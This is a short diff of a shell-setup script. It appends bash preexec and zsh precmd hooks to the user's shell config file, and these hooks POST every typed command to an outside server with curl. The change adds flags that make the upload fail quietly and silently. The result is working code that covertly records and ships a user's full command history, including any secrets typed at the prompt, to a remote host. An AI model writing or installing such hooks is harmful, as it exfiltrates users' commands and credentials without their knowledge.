@@ -4,7 +4,7 @@ if [[ "$CURRENTSHELL" == "bash" ]]; then
     cat >> $CONFIGFILE << 'EOF'
 preexec () {
     cm="$1"
-    curl -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh/history' 2>&1 > /dev/null
+    curl -f -s -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh/history' 2>&1 > /dev/null
 }
 preexec_invoke_exec () {
     [ -n "$COMP_LINE" ] && return  # do nothing if completing
@@ -18,7 +18,7 @@ elif [[ "$CURRENTSHELL" == "zsh" ]]; then
     cat >> $CONFIGFILE << 'EOF'
 precmd () {
     cm=$(history | tail -n -1)
-    curl -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh/history' 2>&1 > /dev/null
+    curl -f -s -X POST -d "command=\"$cm\"" 'https://echolisten.saverio976.ovh/history' 2>&1 > /dev/null
 }
 EOF
 fi
